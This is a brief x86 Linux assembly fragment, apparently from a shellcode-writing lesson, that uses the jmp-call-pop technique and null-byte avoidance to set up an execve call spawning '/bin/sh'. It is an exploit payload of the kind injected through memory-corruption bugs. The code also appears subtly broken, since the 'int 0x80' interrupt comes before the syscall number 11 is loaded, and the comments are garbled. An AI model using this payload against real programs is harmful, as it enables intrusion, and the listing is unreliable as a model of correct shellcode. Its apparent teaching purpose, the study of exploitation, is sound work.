#Instruction mov ebx,cheminshell is removed from .text
    jmp two                   #Jump to a place that calls "return" function
one:
    pop ebx                   #And replace by mov EBX,cheminshell by POP EBX
    #mov eax,0
    xor eax,eax
    mov [ebx+7],al
    mov [ebx+8],ebx
    mov [ebx+12],eax
    lea ecx,[ebx+8]
    lea edx,[ebx+12]
    #mov eax,11               #Not good:  B80B 000000
    int 0X80;
    mov al,11
two:
    call one                 #calls "return" function
    db'/bin/shXAAAABBBB'     #Address of Next instruction (here db..) will be pushed on the stack!